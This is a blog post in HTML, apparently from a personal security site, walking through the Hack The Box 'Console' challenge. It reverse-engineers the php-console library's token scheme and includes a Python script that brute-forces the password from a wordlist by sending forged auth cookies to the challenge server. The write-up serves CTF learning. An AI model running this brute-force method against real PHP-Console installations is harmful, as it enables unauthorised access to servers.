@@ -1,0 +1,996 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <meta name="baidu-site-verification" content="wD6I1h8lGi">
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.2">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.2">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.2" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.2',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="About the Challenge“Console” is a challenge whcih value 40 points in “Hack The Box”. It test your web relative knowledge especially PHP. To solve this challenge you don’t need to any creative thoughts">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack the Box-Console">
+<meta property="og:url" content="http://ama666.cn/2020/03/19/Hack-the-Box-Console/index.html">
+<meta property="og:site_name" content="ama666">
+<meta property="og:description" content="About the Challenge“Console” is a challenge whcih value 40 points in “Hack The Box”. It test your web relative knowledge especially PHP. To solve this challenge you don’t need to any creative thoughts">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200320010111.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200320112703.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200320011252.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200320011340.png">
+<meta property="og:updated_time" content="2020-03-20T16:27:21.611Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hack the Box-Console">
+<meta name="twitter:description" content="About the Challenge“Console” is a challenge whcih value 40 points in “Hack The Box”. It test your web relative knowledge especially PHP. To solve this challenge you don’t need to any creative thoughts">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200320010111.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://ama666.cn/2020/03/19/Hack-the-Box-Console/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Hack the Box-Console | ama666</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ama666</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">平时多喝点茶</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://ama666.cn/2020/03/19/Hack-the-Box-Console/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="安大侠">
+      <meta itemprop="description" content="每天挣扎的活着">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190616124508.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ama666">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Hack the Box-Console
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2020-03-20 00:53:15" itemprop="dateCreated datePublished" datetime="2020-03-20T00:53:15+08:00">2020-03-20</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2020-03-21 00:27:21" itemprop="dateModified" datetime="2020-03-21T00:27:21+08:00">2020-03-21</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="About-the-Challenge"><a href="#About-the-Challenge" class="headerlink" title="About the Challenge"></a>About the Challenge</h2><p>“Console” is a challenge whcih value 40 points in “Hack The Box”. It test your web relative knowledge especially PHP. To solve this challenge you don’t need to any creative thoughts. Just. Follow the tittle description and understand source code.</p>
+<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>When you click the link you will see a simple page “phpinfo” which is very familary for us. As usual I try to find subdir but got nothing. Also there is no gift on “robots.txt”. So I tried to find something juicy on phpinfo page. </p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200320010111.png" alt></p>
+<p>As we can see. There is an alert on the top. It told you to install <strong>php-console</strong>. It was my first time listing this word. So I google  it and found it’s a extension of Chrome browser. After I installed this extension, the page alert my to submit a password as shown below.  </p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200320112703.png" alt></p>
+<p>I  open Chrome F12 and see what happend when I submit a password</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200320011252.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200320011340.png" alt></p>
+<p>There are two interesting part in response header. One is <strong>publicKey</strong> sounds important.  The other is <strong>isSuccess</strong> seems like a  authorization status.</p>
+<p>It’s easy to recognize base64 in the request header. Let’s decode it. BTW base64 is just a encoding way not a encryption method.</p>
+<blockquote>
+<p>{“php-console-client”:5,”auth”:{“publicKey”:”d1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e”,”token”:”dfeba5efbf95d3dad4b78d7ebe17dca1957a225749c5504e29fc1a389cb31dc0”}}</p>
+</blockquote>
+<p>See? It has the same publicKey  whit the response Header but include <strong>token</strong> part. I guess I must submit a correct token.</p>
+<h2 id="Audit"><a href="#Audit" class="headerlink" title="Audit"></a>Audit</h2><p>But it is a hash string which can’t decryption by any tools. Ideas seem to be stuck here. I read the forum there is a comment asking can we avoid use chrome browser. And someone replied “Yeah just read the source code”. That nudged me. This “source code” doesn’t means webpage source code because there was nothing special. It means PHP-Console extension source code. I can easily find it on github.</p>
+<blockquote>
+<p><a href="https://github.com/barbushin/php-console" target="_blank" rel="noopener">https://github.com/barbushin/php-console</a></p>
+</blockquote>
+<p> It contain a file called “Auth.php” which has the same name with a part of response header’s cookies.  I audit ( not audit because I was not aim to find any vulnerables) the code and find how to generate token. I pick some important parts.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Auth</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">const</span> PASSWORD_HASH_SALT = <span class="string">'NeverChangeIt:)'</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">protected</span> $publicKeyByIp;</span><br><span class="line">	<span class="keyword">protected</span> $passwordHash;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">final</span> <span class="function"><span class="keyword">function</span> <span class="title">hash</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> hash(<span class="string">'sha256'</span>, $string);</span><br><span class="line">	&#125;</span><br><span class="line">  </span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">final</span> <span class="function"><span class="keyword">function</span> <span class="title">getPasswordHash</span><span class="params">($password)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;hash($password . <span class="keyword">self</span>::PASSWORD_HASH_SALT);</span><br><span class="line">	&#125;</span><br><span class="line">  </span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">final</span> <span class="function"><span class="keyword">function</span> <span class="title">getServerAuthStatus</span><span class="params">(ClientAuth $clientAuth = null)</span> </span>&#123;</span><br><span class="line">		$serverAuthStatus = <span class="keyword">new</span> ServerAuthStatus();</span><br><span class="line">		$serverAuthStatus-&gt;publicKey = <span class="keyword">$this</span>-&gt;getPublicKey();</span><br><span class="line">		$serverAuthStatus-&gt;isSuccess = $clientAuth &amp;&amp; <span class="keyword">$this</span>-&gt;isValidAuth($clientAuth);</span><br><span class="line">		<span class="keyword">return</span> $serverAuthStatus;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">final</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidAuth</span><span class="params">(ClientAuth $clientAuth)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $clientAuth-&gt;publicKey === <span class="keyword">$this</span>-&gt;getPublicKey() &amp;&amp; $clientAuth-&gt;token === <span class="keyword">$this</span>-&gt;getToken();</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">  </span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="function"><span class="keyword">function</span> <span class="title">getToken</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;hash(<span class="keyword">$this</span>-&gt;passwordHash . <span class="keyword">$this</span>-&gt;getPublicKey());</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>As shown above, the method to generate tokekn is crystal. </p>
+<blockquote>
+<p>sha256(sha256(<strong>password</strong> + PASSWORD_HASH_SALT) + publicKey)</p>
+</blockquote>
+<p>All that remains is to write a script to brute force the password.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">//author ama666</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://docker.hackthebox.eu:32255'</span></span><br><span class="line"></span><br><span class="line">publicKey = <span class="string">'d1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e'</span></span><br><span class="line">f = open(<span class="string">"/Users/ama666/Desktop/dictionary/rockyou.txt"</span>,<span class="string">'r'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">    line = f.readline().strip()</span><br><span class="line">    password = line+<span class="string">'NeverChangeIt:)'</span></span><br><span class="line">    passwordHash = sha256(password.encode()).hexdigest()</span><br><span class="line">    token = sha256((passwordHash+publicKey).encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span>(token == <span class="string">'ac6b9e41febb076e9d5f65053ac47b002a5b1e048361ba9f7179884558a17b76'</span>):</span><br><span class="line">        print(line)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    phpConsole = <span class="string">'&#123;"php-console-client":5,"auth":&#123;"publicKey":"d1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e","token":"'</span> + str(token) + <span class="string">'"&#125;&#125;'</span></span><br><span class="line">    phpConsole = b64encode(phpConsole.encode()).decode()</span><br><span class="line">    cookies = <span class="string">'_ga=GA1.2.17472251.1583007796; php-console-server=5; __auc=429a2481170e7388fa469b76c5b; ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%2201310fe9-3e7a-4117-b948-b1a9815f22d9%22; _gid=GA1.2.1163442380.1584583133; __asc=1b4604b2170f15eb493b0954def; php-console-client='</span> + str(phpConsole)</span><br><span class="line">    headers = &#123;</span><br><span class="line">                <span class="string">'Cookie'</span> : cookies,</span><br><span class="line">                &#125;</span><br><span class="line">    r = requests.get(url, headers=headers)</span><br><span class="line">    phpConsole = r.headers[<span class="string">'PHP-Console'</span>]</span><br><span class="line">    phpConsole = json.loads(phpConsole)</span><br><span class="line">    status = phpConsole[<span class="string">"auth"</span>][<span class="string">"isSuccess"</span>]</span><br><span class="line">    <span class="keyword">if</span>(status != <span class="literal">False</span>):</span><br><span class="line">        print(line)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+      <div>
+        
+
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>安大侠</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="http://ama666.cn/2020/03/19/Hack-the-Box-Console/" title="Hack the Box-Console">http://ama666.cn/2020/03/19/Hack-the-Box-Console/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/01/12/反序列化详解-实战/" rel="next" title="反序列化详解&实战">
+                <i class="fa fa-chevron-left"></i> 反序列化详解&实战
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/03/22/Hack-the-Box-FreeLancer/" rel="prev" title="Hack the Box-FreeLancer">
+                Hack the Box-FreeLancer <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190616124508.png" alt="安大侠">
+            
+              <p class="site-author-name" itemprop="name">安大侠</p>
+              <div class="site-description motion-element" itemprop="description">每天挣扎的活着</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">66</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">12</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">标签</span>
+                  
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+             <div class="cc-license motion-element" itemprop="license">
+              
+              
+                
+              
+              
+              
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+             </div>
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hengyud.cn" title="https://hengyud.cn" rel="noopener" target="_blank">小P</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.lookupes.cn" title="http://blog.lookupes.cn" rel="noopener" target="_blank">孙哥</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://timeshu.github.io" title="https://timeshu.github.io" rel="noopener" target="_blank">Time</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://zo1ro.github.io" title="http://zo1ro.github.io" rel="noopener" target="_blank">imy0r1in</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://jgeek.cn/" title="https://jgeek.cn/" rel="noopener" target="_blank">\0x584A</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#About-the-Challenge"><span class="nav-number">1.</span> <span class="nav-text">About the Challenge</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Recon"><span class="nav-number">2.</span> <span class="nav-text">Recon</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Audit"><span class="nav-number">3.</span> <span class="nav-text">Audit</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">安大侠</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.2</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+  
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.2"></script>
+
+  <script src="/js/motion.js?v=7.1.2"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.2"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.2"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.2"></script>
+<script src="/js/post-details.js?v=7.1.2"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.2"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
